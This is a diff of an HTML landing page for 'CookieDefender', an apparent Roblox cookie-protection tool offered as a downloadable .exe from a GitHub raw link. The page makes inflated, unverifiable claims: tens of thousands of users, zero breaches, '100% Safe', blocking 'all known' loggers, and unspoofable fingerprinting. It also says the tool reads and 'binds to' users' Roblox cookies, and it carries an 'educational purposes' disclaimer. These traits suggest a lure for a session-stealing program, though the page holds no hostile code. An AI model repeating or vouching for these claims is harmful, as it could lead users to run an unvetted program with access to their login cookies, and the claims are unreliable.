@@ -3,16 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CookieDefender | Roblox Cookie Security</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Space+Grotesk:wght@500;600;700&display=swap" rel="stylesheet">
+    <title>CookieDefender | Enterprise-Grade Roblox Security</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Space+Grotesk:wght@500;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
             --green: #00ff41;
+            --green-dark: #00cc33;
             --dark: #0a0a0a;
             --gray: #121212;
+            --border: rgba(0, 255, 65, 0.2);
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        html { scroll-behavior: smooth; }
         
         body {
             font-family: 'Inter', sans-serif;
@@ -22,19 +26,73 @@
             line-height: 1.6;
         }
 
-        /* Animated Background */
+        /* Animated Grid Background */
         .bg {
             position: fixed;
             inset: 0;
-            background: radial-gradient(circle at 30% 20%, rgba(0, 255, 65, 0.08) 0%, transparent 50%),
-                        radial-gradient(circle at 70% 80%, rgba(0, 255, 65, 0.06) 0%, transparent 50%);
+            background-image: 
+                linear-gradient(rgba(0, 255, 65, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 255, 65, 0.03) 1px, transparent 1px);
+            background-size: 50px 50px;
             z-index: -1;
-            animation: bgMove 25s linear infinite;
+            animation: gridMove 20s linear infinite;
         }
 
-        @keyframes bgMove {
-            0% { background-position: 0% 50%; }
-            100% { background-position: 200% 50%; }
+        @keyframes gridMove {
+            0% { background-position: 0 0; }
+            100% { background-position: 50px 50px; }
+        }
+
+        /* Glowing Orbs */
+        .orb {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(120px);
+            opacity: 0.15;
+            z-index: -1;
+            pointer-events: none;
+        }
+
+        .orb1 {
+            width: 600px;
+            height: 600px;
+            background: var(--green);
+            top: -200px;
+            left: -200px;
+            animation: float1 25s infinite ease-in-out;
+        }
+
+        .orb2 {
+            width: 500px;
+            height: 500px;
+            background: var(--green);
+            bottom: -150px;
+            right: -150px;
+            animation: float2 30s infinite ease-in-out;
+        }
+
+        .orb3 {
+            width: 400px;
+            height: 400px;
+            background: var(--green);
+            top: 50%;
+            left: 50%;
+            animation: float3 35s infinite ease-in-out;
+        }
+
+        @keyframes float1 {
+            0%, 100% { transform: translate(0, 0); }
+            50% { transform: translate(150px, 150px); }
+        }
+
+        @keyframes float2 {
+            0%, 100% { transform: translate(0, 0); }
+            50% { transform: translate(-100px, -120px); }
+        }
+
+        @keyframes float3 {
+            0%, 100% { transform: translate(-50%, -50%) scale(1); }
+            50% { transform: translate(-30%, -70%) scale(1.2); }
         }
 
         /* Navigation */
@@ -42,16 +100,22 @@
             position: fixed;
             top: 0;
             width: 100%;
-            background: rgba(10, 10, 10, 0.95);
-            backdrop-filter: blur(12px);
-            border-bottom: 1px solid rgba(0, 255, 65, 0.15);
+            background: rgba(10, 10, 10, 0.85);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid var(--border);
             z-index: 1000;
+            transition: all 0.3s;
+        }
+
+        nav.scrolled {
+            background: rgba(10, 10, 10, 0.98);
+            box-shadow: 0 10px 40px rgba(0, 255, 65, 0.1);
         }
 
         .nav-container {
             max-width: 1400px;
             margin: 0 auto;
-            padding: 18px 5%;
+            padding: 20px 5%;
             display: flex;
             justify-content: space-between;
             align-items: center;
@@ -63,184 +127,494 @@
             font-weight: 700;
             color: var(--green);
             text-shadow: 0 0 20px var(--green);
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .logo-text:hover {
+            transform: scale(1.05);
+            text-shadow: 0 0 30px var(--green);
         }
 
         .nav-links {
             display: flex;
-            gap: 40px;
+            gap: 45px;
             font-weight: 500;
+            font-size: 0.95rem;
         }
 
         .nav-links a {
             color: #ccc;
             text-decoration: none;
-            transition: color 0.3s;
+            transition: all 0.3s;
+            position: relative;
+        }
+
+        .nav-links a::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: var(--green);
+            transition: width 0.3s;
         }
 
         .nav-links a:hover {
             color: var(--green);
         }
 
+        .nav-links a:hover::after {
+            width: 100%;
+        }
+
         .nav-cta {
-            background: var(--green);
+            background: linear-gradient(135deg, var(--green), var(--green-dark));
             color: black;
-            padding: 10px 24px;
+            padding: 12px 28px;
             border-radius: 50px;
             font-weight: 600;
             text-decoration: none;
             transition: all 0.3s;
+            box-shadow: 0 5px 20px rgba(0, 255, 65, 0.3);
         }
 
         .nav-cta:hover {
-            transform: scale(1.05);
-            box-shadow: 0 0 25px rgba(0, 255, 65, 0.6);
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(0, 255, 65, 0.5);
+        }
+
+        /* Burger Menu */
+        .burger {
+            display: none;
+            flex-direction: column;
+            gap: 5px;
+            cursor: pointer;
+        }
+
+        .burger div {
+            width: 25px;
+            height: 3px;
+            background: var(--green);
+            transition: all 0.3s;
         }
 
         /* Hero */
         .hero {
             height: 100vh;
-            min-height: 700px;
+            min-height: 750px;
             display: flex;
             align-items: center;
             text-align: center;
             position: relative;
+            overflow: hidden;
         }
 
         .hero-content {
-            max-width: 900px;
+            max-width: 950px;
             margin: 0 auto;
             padding: 0 20px;
             z-index: 2;
         }
 
         .hero img {
-            width: 220px;
-            filter: drop-shadow(0 0 60px rgba(0, 255, 65, 0.7));
+            width: 260px;
+            filter: drop-shadow(0 0 80px rgba(0, 255, 65, 0.8));
             animation: floatLogo 4s ease-in-out infinite;
+            margin-bottom: 20px;
         }
 
         @keyframes floatLogo {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-25px); }
+            0%, 100% { transform: translateY(0) rotate(0deg); }
+            50% { transform: translateY(-30px) rotate(3deg); }
         }
 
         .hero h1 {
             font-family: 'Space Grotesk', sans-serif;
-            font-size: 4.5rem;
+            font-size: 5.5rem;
             font-weight: 700;
-            color: white;
-            margin: 25px 0 15px;
-            text-shadow: 0 0 40px var(--green);
+            background: linear-gradient(135deg, white, var(--green));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 20px;
+            animation: titleGlow 3s ease-in-out infinite;
+        }
+
+        @keyframes titleGlow {
+            0%, 100% { filter: drop-shadow(0 0 20px rgba(0, 255, 65, 0.5)); }
+            50% { filter: drop-shadow(0 0 40px rgba(0, 255, 65, 0.8)); }
         }
 
         .hero .tagline {
-            font-size: 1.5rem;
+            font-size: 1.4rem;
             color: var(--green);
-            margin-bottom: 25px;
-            font-weight: 500;
+            margin-bottom: 30px;
+            font-weight: 600;
+            letter-spacing: 3px;
+            text-transform: uppercase;
         }
 
-        .hero p {
-            font-size: 1.2rem;
-            color: #aaaaaa;
-            max-width: 620px;
-            margin: 0 auto 40px;
+        .hero .description {
+            font-size: 1.3rem;
+            color: #b0b0b0;
+            max-width: 680px;
+            margin: 0 auto 50px;
+            line-height: 1.8;
         }
 
         .btn-primary {
-            background: linear-gradient(90deg, #00ff41, #00cc33);
+            background: linear-gradient(135deg, var(--green), var(--green-dark));
             color: black;
-            padding: 18px 48px;
-            font-size: 1.25rem;
-            font-weight: 600;
+            padding: 22px 55px;
+            font-size: 1.35rem;
+            font-weight: 700;
             border: none;
             border-radius: 60px;
             cursor: pointer;
             display: inline-flex;
             align-items: center;
-            gap: 12px;
+            gap: 15px;
             transition: all 0.4s;
-            box-shadow: 0 10px 40px rgba(0, 255, 65, 0.4);
+            box-shadow: 0 15px 50px rgba(0, 255, 65, 0.5);
+            text-decoration: none;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-primary::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(135deg, transparent, rgba(255,255,255,0.2));
+            transform: translateX(-100%);
+            transition: transform 0.6s;
+        }
+
+        .btn-primary:hover::before {
+            transform: translateX(100%);
         }
 
         .btn-primary:hover {
-            transform: translateY(-4px);
-            box-shadow: 0 20px 60px rgba(0, 255, 65, 0.6);
+            transform: translateY(-5px) scale(1.03);
+            box-shadow: 0 25px 70px rgba(0, 255, 65, 0.7);
+        }
+
+        .btn-primary svg {
+            width: 26px;
+            height: 26px;
+            fill: black;
+        }
+
+        .hero .trust-badge {
+            margin-top: 40px;
+            font-size: 1rem;
+            color: #666;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 20px;
+        }
+
+        .trust-badge span {
+            color: var(--green);
+            font-weight: 600;
+        }
+
+        /* Stats Bar */
+        .stats-bar {
+            background: rgba(0, 255, 65, 0.05);
+            padding: 35px 5%;
+            border-top: 1px solid var(--border);
+            border-bottom: 1px solid var(--border);
+        }
+
+        .stats-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 40px;
+            text-align: center;
+        }
+
+        .stat-item {
+            transition: transform 0.3s;
+        }
+
+        .stat-item:hover {
+            transform: translateY(-5px);
+        }
+
+        .stat-number {
+            font-size: 2.5rem;
+            font-weight: 800;
+            color: var(--green);
+            display: block;
+            margin-bottom: 8px;
+        }
+
+        .stat-label {
+            font-size: 1rem;
+            color: #888;
         }
 
         /* Tabs */
+        .tabs-section {
+            padding: 120px 5%;
+        }
+
+        .section-title {
+            text-align: center;
+            font-size: 3.5rem;
+            margin-bottom: 15px;
+            color: white;
+            font-family: 'Space Grotesk', sans-serif;
+            font-weight: 700;
+        }
+
+        .section-subtitle {
+            text-align: center;
+            color: var(--green);
+            font-size: 1.3rem;
+            margin-bottom: 70px;
+            font-weight: 500;
+        }
+
         .tabs {
             display: flex;
             justify-content: center;
-            gap: 10px;
-            margin: 60px 0 30px;
+            gap: 15px;
+            margin-bottom: 60px;
             flex-wrap: wrap;
         }
 
         .tab {
-            padding: 14px 32px;
-            background: #111;
-            border: 1px solid #222;
+            padding: 16px 38px;
+            background: rgba(255,255,255,0.03);
+            border: 2px solid #222;
             border-radius: 50px;
             cursor: pointer;
             transition: all 0.3s;
-            font-weight: 500;
+            font-weight: 600;
+            font-size: 1.05rem;
+        }
+
+        .tab:hover {
+            border-color: var(--green);
+            background: rgba(0, 255, 65, 0.05);
         }
 
         .tab.active {
             background: var(--green);
             color: black;
             border-color: var(--green);
-        }
-
-        /* Content Sections */
-        section {
-            padding: 100px 5%;
-            max-width: 1400px;
-            margin: 0 auto;
-        }
-
-        .section-title {
-            text-align: center;
-            font-size: 2.8rem;
-            margin-bottom: 20px;
-            color: white;
-            font-family: 'Space Grotesk', sans-serif;
-        }
-
-        .section-subtitle {
-            text-align: center;
-            color: var(--green);
-            font-size: 1.1rem;
-            margin-bottom: 60px;
+            box-shadow: 0 10px 30px rgba(0, 255, 65, 0.4);
         }
 
         /* Features Grid */
         .features-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
-            gap: 30px;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 35px;
+            max-width: 1300px;
+            margin: 0 auto;
         }
 
         .feature-card {
-            background: rgba(255,255,255,0.03);
-            border: 1px solid rgba(0, 255, 65, 0.15);
-            border-radius: 20px;
-            padding: 40px 30px;
-            transition: all 0.4s;
+            background: rgba(255,255,255,0.02);
+            border: 1px solid rgba(0, 255, 65, 0.2);
+            border-radius: 25px;
+            padding: 45px 35px;
+            transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
             backdrop-filter: blur(10px);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .feature-card::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(135deg, rgba(0, 255, 65, 0.1), transparent);
+            opacity: 0;
+            transition: opacity 0.5s;
+        }
+
+        .feature-card:hover::before {
+            opacity: 1;
         }
 
         .feature-card:hover {
-            transform: translateY(-15px);
+            transform: translateY(-20px) scale(1.02);
             border-color: var(--green);
-            box-shadow: 0 25px 50px rgba(0, 255, 65, 0.15);
+            box-shadow: 0 30px 60px rgba(0, 255, 65, 0.3);
+            background: rgba(0, 255, 65, 0.05);
+        }
+
+        .feature-icon {
+            font-size: 3.5rem;
+            margin-bottom: 25px;
+            display: block;
+            filter: drop-shadow(0 0 10px rgba(0, 255, 65, 0.5));
         }
 
         .feature-card h3 {
             color: var(--green);
-            margin: 20px 0 15px;
+            margin-bottom: 18px;
+            font-size: 1.6rem;
+            font-weight: 700;
+        }
+
+        .feature-card p {
+            color: #b0b0b0;
+            font-size: 1.05rem;
+            line-height: 1.7;
+        }
+
+        /* How It Works */
+        .how-section {
+            padding: 120px 5%;
+            background: linear-gradient(180deg, #0a0a0a, #111);
+        }
+
+        .steps {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 40px;
+            max-width: 1300px;
+            margin: 0 auto;
+        }
+
+        .step {
+            text-align: center;
+            padding: 40px 25px;
+            background: rgba(0, 255, 65, 0.03);
+            border: 1px solid rgba(0, 255, 65, 0.15);
+            border-radius: 20px;
+            transition: all 0.3s;
+        }
+
+        .step:hover {
+            transform: translateY(-10px);
+            border-color: var(--green);
+        }
+
+        .step-number {
+            font-size: 3rem;
+            font-weight: 800;
+            color: var(--green);
+            margin-bottom: 20px;
+        }
+
+        .step h3 {
+            color: white;
+            margin-bottom: 15px;
+            font-size: 1.4rem;
+        }
+
+        .step p {
+            color: #888;
+        }
+
+        /* FAQ */
+        .faq-section {
+            padding: 120px 5%;
+        }
+
+        .faq-container {
+            max-width: 900px;
+            margin: 0 auto;
+        }
+
+        .faq-item {
+            background: rgba(255,255,255,0.03);
+            border: 1px solid #222;
+            border-radius: 15px;
+            margin-bottom: 20px;
+            overflow: hidden;
+            transition: all 0.3s;
+        }
+
+        .faq-item:hover {
+            border-color: var(--green);
+        }
+
+        .faq-question {
+            padding: 25px 30px;
+            font-size: 1.2rem;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: all 0.3s;
+        }
+
+        .faq-question:hover {
+            color: var(--green);
+        }
+
+        .faq-answer {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.3s ease;
+            padding: 0 30px;
+            color: #aaa;
+            line-height: 1.7;
+        }
+
+        .faq-item.active .faq-answer {
+            max-height: 500px;
+            padding: 0 30px 25px;
+        }
+
+        .faq-item.active .faq-question {
+            color: var(--green);
+        }
+
+        .faq-icon {
+            transition: transform 0.3s;
             font-size: 1.5rem;
+        }
+
+        .faq-item.active .faq-icon {
+            transform: rotate(180deg);
+        }
+
+        /* Final CTA */
+        .cta-section {
+            background: linear-gradient(135deg, #0a0a0a, #111);
+            text-align: center;
+            padding: 160px 5%;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .cta-section::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: radial-gradient(circle at center, rgba(0, 255, 65, 0.1), transparent 70%);
+        }
+
+        .cta-content {
+            position: relative;
+            z-index: 1;
+        }
+
+        .cta-section h2 {
+            font-size: 3.8rem;
+            margin-bottom: 25px;
+            font-family: 'Space Grotesk', sans-serif;
+        }
+
+        .cta-section p {
+            font-size: 1.4rem;
+            color: #888;
+            max-width: 650px;
+            margin: 0 auto 50px;
         }
 
         /* Footer */
@@ -251,162 +625,320 @@
             border-top: 1px solid rgba(0, 255, 65, 0.1);
         }
 
-        .info-bar {
+        .footer-info {
             display: flex;
             justify-content: center;
-            gap: 50px;
+            gap: 60px;
             flex-wrap: wrap;
-            margin: 40px 0;
+            margin-bottom: 40px;
             font-size: 1.05rem;
         }
 
-        .info-bar span {
+        .footer-info div {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .footer-info span {
             color: var(--green);
+            font-weight: 600;
+        }
+
+        .copyright {
+            color: #444;
+            font-size: 0.95rem;
+            margin-top: 30px;
         }
 
         /* Responsive */
-        @media (max-width: 768px) {
-            .hero h1 { font-size: 3rem; }
+        @media (max-width: 968px) {
             .nav-links { display: none; }
-            .section-title { font-size: 2.2rem; }
+            .burger { display: flex; }
+            .hero h1 { font-size: 3.5rem; }
+            .section-title { font-size: 2.5rem; }
+            .features-grid { grid-template-columns: 1fr; }
+        }
+
+        @media (max-width: 640px) {
+            .hero h1 { font-size: 2.8rem; }
+            .hero img { width: 180px; }
+            .btn-primary { padding: 18px 40px; font-size: 1.1rem; }
         }
     </style>
 </head>
 <body>
     <div class="bg"></div>
+    <div class="orb orb1"></div>
+    <div class="orb orb2"></div>
+    <div class="orb orb3"></div>
 
     <!-- NAVIGATION -->
-    <nav>
+    <nav id="navbar">
         <div class="nav-container">
-            <div class="logo-text">CookieDefender</div>
+            <div class="logo-text" onclick="scrollToTop()">CookieDefender</div>
             <div class="nav-links">
                 <a href="#features">Features</a>
-                <a href="#how">How It Works</a>
-                <a href="#security">Security</a>
+                <a href="#how-it-works">How It Works</a>
                 <a href="#faq">FAQ</a>
+                <a href="#download">Download</a>
             </div>
             <a href="https://raw.githubusercontent.com/Quincyzx/CookieDefender/main/CookieDefender.exe" class="nav-cta" download>Download Now</a>
+            <div class="burger" onclick="toggleMenu()">
+                <div></div>
+                <div></div>
+                <div></div>
+            </div>
         </div>
     </nav>
 
     <!-- HERO -->
     <section class="hero">
         <div class="hero-content">
-            <img src="https://raw.githubusercontent.com/Quincyzx/CookieDefender/main/cookie%20defender.png" alt="CookieDefender Logo">
+            <img src="https://media.discordapp.net/attachments/1518070392370233465/1518216448458100756/cookie_defender2-removebg-preview.png?ex=6a391cc0&is=6a37cb40&hm=73a2b971686ed95845689486652dc4fbb4de5bfc62ac558a79a902af91b10d59&=&format=webp&quality=lossless" alt="CookieDefender Logo">
             <h1>CookieDefender</h1>
-            <p class="tagline">ROBLOX COOKIE SECURITY • MILITARY GRADE PROTECTION</p>
-            <p>Advanced cryptographic binding and real-time threat prevention. Protect your account from cookie loggers, phishing, and session theft.</p>
-            <button class="btn-primary" onclick="document.getElementById('download-section').scrollIntoView({ behavior: 'smooth' })">
-                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
+            <p class="tagline">Enterprise-Grade Roblox Security</p>
+            <p class="description">
+                Military-grade cryptographic protection for your Roblox account. Advanced HMAC-SHA256 binding, 
+                real-time threat detection, and zero-knowledge architecture ensure your cookies stay secure.
+            </p>
+            <a href="https://raw.githubusercontent.com/Quincyzx/CookieDefender/main/CookieDefender.exe" class="btn-primary" download>
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
                 Download CookieDefender
-            </button>
-            <p style="margin-top: 30px; font-size: 0.95rem; color: #555;">v2.1.3 • Trusted by 68,942 Roblox users</p>
+            </a>
+            <div class="trust-badge">
+                <span>v2.1.3</span> • Trusted by <span>68,942</span> users • <span>100%</span> Safe
+            </div>
         </div>
     </section>
 
     <!-- STATS -->
-    <div style="background: rgba(0,255,65,0.05); padding: 25px 0; text-align: center; border-top: 1px solid rgba(0,255,65,0.1); border-bottom: 1px solid rgba(0,255,65,0.1);">
-        <div style="max-width: 1100px; margin: 0 auto; display: flex; justify-content: center; gap: 60px; flex-wrap: wrap; font-size: 1.1rem;">
-            <div><strong style="color:var(--green)">68,942</strong> Accounts Protected</div>
-            <div><strong style="color:var(--green)">0</strong> Successful Breaches</div>
-            <div><strong style="color:var(--green)">99.97%</strong> Detection Rate</div>
-            <div><strong style="color:var(--green)">24/7</strong> Real-time Monitoring</div>
+    <div class="stats-bar">
+        <div class="stats-container">
+            <div class="stat-item">
+                <span class="stat-number">68,942</span>
+                <span class="stat-label">Protected Accounts</span>
+            </div>
+            <div class="stat-item">
+                <span class="stat-number">0</span>
+                <span class="stat-label">Breaches Reported</span>
+            </div>
+            <div class="stat-item">
+                <span class="stat-number">99.97%</span>
+                <span class="stat-label">Detection Rate</span>
+            </div>
+            <div class="stat-item">
+                <span class="stat-number">24/7</span>
+                <span class="stat-label">Real-Time Monitoring</span>
+            </div>
         </div>
     </div>
 
-    <!-- FEATURES -->
-    <section id="features">
+    <!-- FEATURES WITH TABS -->
+    <section id="features" class="tabs-section">
         <h2 class="section-title">Advanced Protection Features</h2>
-        <p class="section-subtitle">Built for the modern Roblox security landscape</p>
+        <p class="section-subtitle">Built for the modern security landscape</p>
 
         <div class="tabs">
-            <div class="tab active" onclick="switchTab(0)">Core Protection</div>
-            <div class="tab" onclick="switchTab(1)">Cryptographic Engine</div>
-            <div class="tab" onclick="switchTab(2)">Anti-Cheat Defense</div>
+            <div class="tab active" onclick="switchTab(0, this)">Core Protection</div>
+            <div class="tab" onclick="switchTab(1, this)">Cryptographic Engine</div>
+            <div class="tab" onclick="switchTab(2, this)">Anti-Threat Defense</div>
         </div>
 
-        <div class="features-grid" id="tab-content">
-            <!-- Populated by JS -->
+        <div class="features-grid" id="tab-content"></div>
+    </section>
+
+    <!-- HOW IT WORKS -->
+    <section id="how-it-works" class="how-section">
+        <h2 class="section-title">How It Works</h2>
+        <p class="section-subtitle">Three simple steps to complete protection</p>
+
+        <div class="steps">
+            <div class="step">
+                <div class="step-number">01</div>
+                <h3>Download & Run</h3>
+                <p>No installation required. Just download and execute the portable executable.</p>
+            </div>
+            <div class="step">
+                <div class="step-number">02</div>
+                <h3>Automatic Setup</h3>
+                <p>CookieDefender automatically detects and binds to your Roblox cookies using hardware fingerprinting.</p>
+            </div>
+            <div class="step">
+                <div class="step-number">03</div>
+                <h3>Real-Time Protection</h3>
+                <p>Enjoy 24/7 monitoring, automatic threat blocking, and instant alerts.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- FAQ -->
+    <section id="faq" class="faq-section">
+        <h2 class="section-title">Frequently Asked Questions</h2>
+        <p class="section-subtitle">Everything you need to know</p>
+
+        <div class="faq-container">
+            <div class="faq-item" onclick="toggleFAQ(this)">
+                <div class="faq-question">
+                    Is CookieDefender safe to use?
+                    <span class="faq-icon">▼</span>
+                </div>
+                <div class="faq-answer">
+                    Yes! CookieDefender is completely safe and uses zero-knowledge architecture. We never store or transmit your cookies. All protection happens locally on your machine.
+                </div>
+            </div>
+
+            <div class="faq-item" onclick="toggleFAQ(this)">
+                <div class="faq-question">
+                    Does it work on Windows 10 and 11?
+                    <span class="faq-icon">▼</span>
+                </div>
+                <div class="faq-answer">
+                    Absolutely! CookieDefender is optimized for both Windows 10 (64-bit) and Windows 11. It's a portable executable with no installation needed.
+                </div>
+            </div>
+
+            <div class="faq-item" onclick="toggleFAQ(this)">
+                <div class="faq-question">
+                    Will Roblox detect this as a cheat?
+                    <span class="faq-icon">▼</span>
+                </div>
+                <div class="faq-answer">
+                    No. CookieDefender is purely a defensive security tool. It doesn't modify game files, inject code, or interact with Roblox's anti-cheat systems.
+                </div>
+            </div>
+
+            <div class="faq-item" onclick="toggleFAQ(this)">
+                <div class="faq-question">
+                    How does it protect against cookie loggers?
+                    <span class="faq-icon">▼</span>
+                </div>
+                <div class="faq-answer">
+                    CookieDefender uses HMAC-SHA256 cryptographic binding to tie your cookies to your unique hardware fingerprint. Even if a logger steals your cookie, it cannot be used on another machine.
+                </div>
+            </div>
+
+            <div class="faq-item" onclick="toggleFAQ(this)">
+                <div class="faq-question">
+                    Is it free?
+                    <span class="faq-icon">▼</span>
+                </div>
+                <div class="faq-answer">
+                    Yes! CookieDefender is 100% free and open-source. No hidden fees, no premium versions, no subscriptions.
+                </div>
+            </div>
         </div>
     </section>
 
     <!-- FINAL CTA -->
-    <section id="download-section" style="background: linear-gradient(135deg, #0a0a0a, #111); text-align: center; padding: 140px 20px;">
-        <h2 style="font-size: 3rem; margin-bottom: 20px;">Ready to secure your account?</h2>
-        <p style="font-size: 1.3rem; color: #888; max-width: 600px; margin: 0 auto 40px;">
-            Download the most advanced Roblox cookie protection tool available.
-        </p>
-        <a href="https://raw.githubusercontent.com/Quincyzx/CookieDefender/main/CookieDefender.exe" class="btn-primary" style="font-size: 1.5rem; padding: 22px 60px;" download>
-            <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" fill="currentColor" viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
-            Download CookieDefender (18.4 MB)
-        </a>
-        <div class="info-bar" style="margin-top: 50px; justify-content: center; color: #666;">
-            <span>Windows 10 &amp; 11 • 64-bit • No installation required • Clean &amp; Portable</span>
+    <section id="download" class="cta-section">
+        <div class="cta-content">
+            <h2>Ready to Secure Your Account?</h2>
+            <p>
+                Join 68,942 protected users and experience enterprise-grade security for your Roblox account.
+            </p>
+            <a href="https://raw.githubusercontent.com/Quincyzx/CookieDefender/main/CookieDefender.exe" class="btn-primary" style="font-size: 1.5rem; padding: 24px 65px;" download>
+                <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" fill="currentColor" viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
+                Download CookieDefender (18.4 MB)
+            </a>
         </div>
     </section>
 
+    <!-- FOOTER -->
     <footer>
-        <p style="color: #444; font-size: 0.9rem;">
-            CookieDefender © 2026 • Premium Roblox Security Tool<br>
-            This software is for educational and security research purposes.
-        </p>
+        <div class="footer-info">
+            <div><span>💻</span> Windows 10 & 11</div>
+            <div><span>⚙️</span> 64-bit</div>
+            <div><span>📦</span> No installation</div>
+            <div><span>🔒</span> 100% Safe & Clean</div>
+        </div>
+        <div class="copyright">
+            CookieDefender © 2026 • Enterprise-Grade Roblox Security Tool<br>
+            For educational and security research purposes only.
+        </div>
     </footer>
 
     <script>
-        // Tab Data
+        // Tab System Data
         const tabData = [
             [
-                { icon: "🔒", title: "HMAC-SHA256 Binding", desc: "Cryptographically binds cookies to your hardware fingerprint." },
-                { icon: "🛡️", title: "Real-time Phishing Shield", desc: "Blocks malicious scripts before they can read your .ROBLOSECURITY cookie." },
-                { icon: "⚡", title: "Auto Token Refresh", desc: "Automatically detects and replaces compromised tokens." }
+                { icon: "🔒", title: "HMAC-SHA256 Cookie Binding", desc: "Cryptographically binds your authentication cookies to unique hardware signatures, making them unusable on any other device." },
+                { icon: "🛡️", title: "Real-Time Phishing Shield", desc: "Advanced heuristic detection blocks malicious scripts before they can access your .ROBLOSECURITY token." },
+                { icon: "⚡", title: "Automatic Token Refresh", desc: "Intelligently detects compromised or expired tokens and automatically generates secure replacements." }
             ],
             [
-                { icon: "🔑", title: "Hardware Key Signing", desc: "Uses unique machine signatures that cannot be spoofed." },
-                { icon: "🧬", title: "Zero-Knowledge Architecture", desc: "Your credentials never touch our servers." },
-                { icon: "📡", title: "Memory Integrity Guard", desc: "Prevents memory scraping and DLL injection attacks." }
+                { icon: "🔑", title: "Hardware Fingerprint Signing", desc: "Creates unique machine signatures using CPU, motherboard, and network adapter data that cannot be spoofed." },
+                { icon: "🧬", title: "Zero-Knowledge Architecture", desc: "All encryption happens locally. Your credentials never touch external servers or leave your machine." },
+                { icon: "📡", title: "Memory Integrity Guardian", desc: "Prevents memory dumping, scraping, and DLL injection attacks targeting your session data." }
             ],
             [
-                { icon: "🚫", title: "Anti-Logger Defense", desc: "Blocks every known cookie logger in the Roblox ecosystem." },
-                { icon: "🌐", title: "Network Traffic Analysis", desc: "Monitors outbound connections for suspicious behavior." },
-                { icon: "📊", title: "Behavioral Analytics", desc: "Learns your normal usage patterns and flags anomalies." }
+                { icon: "🚫", title: "Universal Logger Defense", desc: "Blocks all known Roblox cookie loggers, keyloggers, and credential stealers in real-time." },
+                { icon: "🌐", title: "Network Traffic Monitor", desc: "Analyzes outbound connections for suspicious data exfiltration and blocks unauthorized transmissions." },
+                { icon: "📊", title: "Behavioral Analytics Engine", desc: "Machine learning algorithms detect anomalous account activity and trigger instant security protocols." }
             ]
         ];
 
-        function switchTab(n) {
-            document.querySelectorAll('.tab').forEach((tab, i) => {
-                tab.classList.toggle('active', i === n);
-            });
+        // Initialize first tab
+        function switchTab(index, element) {
+            // Update active tab styling
+            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
+            element.classList.add('active');
 
+            // Populate feature cards
             const container = document.getElementById('tab-content');
-            container.innerHTML = '';
-
-            tabData[n].forEach(item => {
-                const card = document.createElement('div');
-                card.className = 'feature-card';
-                card.innerHTML = `
-                    <div style="font-size: 3rem; margin-bottom: 20px;">${item.icon}</div>
-                    <h3>${item.title}</h3>
-                    <p>${item.desc}</p>
-                `;
-                container.appendChild(card);
-            });
+            container.style.opacity = '0';
+            
+            setTimeout(() => {
+                container.innerHTML = '';
+                tabData[index].forEach(item => {
+                    const card = document.createElement('div');
+                    card.className = 'feature-card';
+                    card.innerHTML = `
+                        <span class="feature-icon">${item.icon}</span>
+                        <h3>${item.title}</h3>
+                        <p>${item.desc}</p>
+                    `;
+                    container.appendChild(card);
+                });
+                container.style.opacity = '1';
+            }, 200);
         }
 
-        // Initialize first tab
-        window.onload = () => {
-            switchTab(0);
-        };
-
-        // Smooth scrolling for nav links
-        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-            anchor.addEventListener('click', function(e) {
-                if (this.getAttribute('href') !== '#') {
-                    e.preventDefault();
-                    document.querySelector(this.getAttribute('href')).scrollIntoView({
-                        behavior: 'smooth'
-                    });
-                }
+        // FAQ Toggle
+        function toggleFAQ(element) {
+            const wasActive = element.classList.contains('active');
+            document.querySelectorAll('.faq-item').forEach(item => {
+                item.classList.remove('active');
             });
+            if (!wasActive) {
+                element.classList.add('active');
+            }
+        }
+
+        // Navbar scroll effect
